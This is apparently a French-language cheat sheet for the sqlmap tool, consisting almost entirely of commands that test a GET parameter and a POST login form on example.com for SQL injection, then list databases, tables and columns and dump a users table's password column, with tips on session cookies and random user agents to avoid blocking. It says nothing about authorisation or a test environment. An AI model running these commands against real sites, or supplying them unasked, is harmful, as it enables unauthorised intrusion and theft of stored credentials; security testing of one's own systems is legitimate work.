# sqlmap
1. Tester si l’URL est vulnérable (avec un paramètre GET)
<hr>

Installation

```bash
sudo apt install sqlmap
```
lance :
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --level=3 --risk=2
```
* `--batch` : passe les questions interactives en mode automatique
* `--level=3` et --risk=2 : testent plus de techniques (un peu plus agressif)

2. Tester un formulaire POST (comme un login)
Supposons que le formulaire POST se fait sur http://example.com/login.php
avec les champs username et password.

Crée un fichier post_data.txt :

```pgsql
username=admin&password=admin
```
Puis lance :

```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin" --batch --level=3 --risk=2
```
3. Extraire la base de données, tables, colonnes, ou données
Pour lister les bases :

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --dbs
```
Pour lister les tables dans une base mydb :

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch -D mydb --tables
```
Pour lister les colonnes d’une table users :

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch -D mydb -T users --columns
```
Pour extraire les données d’une colonne password :

```bash
sqlmap -u "http://example.com/page.php?id=1" --batch -D mydb -T users -C password --dump
```
4. Autres options utiles
* `--cookie="PHPSESSID=xyz"` si tu as besoin d’authentification via cookie
* `--random-agent` pour changer l’User-Agent et éviter certains blocages
* `--timeout=10` pour allonger le délai si le serveur est lent

